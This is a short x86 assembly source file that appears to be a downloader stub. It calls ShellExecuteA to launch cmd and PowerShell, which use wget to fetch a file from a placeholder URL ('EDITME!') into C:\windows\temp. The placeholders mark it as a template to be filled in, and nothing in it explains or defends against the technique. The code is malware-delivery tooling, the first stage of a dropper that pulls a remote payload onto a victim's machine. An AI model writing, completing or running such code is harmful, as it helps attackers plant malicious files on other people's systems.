extern _ShellExecuteA

section .data
  action db "open",0
  shell db "cmd",0
  malcmd db "/c powershell -Command wget 'EDITME!' -OutFile C:\windows\temp\EDTIME2",0

section .txt
global _main
_main:
  push 0
  push 0
  push malcmd
  push shell
  push action
  push 0
  call _ShellExecuteA
